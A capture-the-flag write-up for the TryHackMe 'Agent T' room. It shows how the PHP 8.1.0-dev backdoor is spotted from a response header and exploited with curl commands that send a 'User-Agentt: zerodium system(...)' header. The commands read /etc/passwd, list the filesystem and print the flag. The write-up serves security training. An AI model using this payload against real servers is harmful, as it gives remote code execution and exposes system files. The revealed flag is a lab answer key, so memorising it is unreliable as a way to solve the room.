📚 [TryHackMe Agent T (X-Powered-By: PHP/8.1.0-dev)](https://tryhackme.com/room/agentt)

> something seems off about how the server responds


## recon

The website is just a template for an admin dashboard: no login, no working link, just HTML.

Since the brief mentions "how the server responds", let's get the headers:

````shell
$ curl --head http://10.67.142.248

...
X-Powered-By: PHP/8.1.0-dev
...
````

PHP/8.1.0-dev is famous for a malicious backdoor that was briefly committed to the official PHP source code in March 2021.

You can execute arbitrary PHP code by adding a custom HTTP header named User-Agentt (note the double 't') starting with the word zerodium.

````
User-Agentt: zerodium system('id');
````

https://www.sophos.com/en-us/blog/php-web-language-narrowly-avoids-dangerous-supply-chain-attack


## exploit

````shell
$ curl -s -H "User-Agentt: zerodium system('cat /etc/passwd');" http://10.67.142.248 | head -50

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
<!DOCTYPE html>
<html lang="en">


$ curl -s -H "User-Agentt: zerodium system('ls -la /');" http://10.67.142.248 | head -50

total 76
drwxr-xr-x   1 root root 4096 Mar  7  2022 .
drwxr-xr-x   1 root root 4096 Mar  7  2022 ..
-rwxr-xr-x   1 root root    0 Mar  7  2022 .dockerenv
drwxr-xr-x   1 root root 4096 Mar 30  2021 bin
drwxr-xr-x   2 root root 4096 Nov 22  2020 boot
drwxr-xr-x   5 root root  340 Jan 12 21:12 dev
drwxr-xr-x   1 root root 4096 Mar  7  2022 etc
-rw-rw-r--   1 root root   38 Mar  5  2022 flag.txt
drwxr-xr-x   2 root root 4096 Nov 22  2020 home
drwxr-xr-x   1 root root 4096 Mar 30  2021 lib
drwxr-xr-x   2 root root 4096 Jan 11  2021 lib64
drwxr-xr-x   2 root root 4096 Jan 11  2021 media
drwxr-xr-x   2 root root 4096 Jan 11  2021 mnt
drwxr-xr-x   2 root root 4096 Jan 11  2021 opt
dr-xr-xr-x 154 root root    0 Jan 12 21:12 proc
drwx------   2 root root 4096 Jan 11  2021 root
drwxr-xr-x   3 root root 4096 Jan 11  2021 run
drwxr-xr-x   2 root root 4096 Jan 11  2021 sbin
drwxr-xr-x   2 root root 4096 Jan 11  2021 srv
dr-xr-xr-x  13 root root    0 Jan 12 21:12 sys
drwxrwxrwt   1 root root 4096 Mar 30  2021 tmp
drwxr-xr-x   1 root root 4096 Jan 11  2021 usr
drwxr-xr-x   1 root root 4096 Mar 30  2021 var
<!DOCTYPE html>
<html lang="en">


$ curl -s -H "User-Agentt: zerodium system('cat /flag.txt');" http://10.67.142.248 | head -50

flag{4127d0530abf16d6d23973e3df8dbecb}<!DOCTYPE html>
````

The flag is `flag{4127d0530abf16d6d23973e3df8dbecb}`.
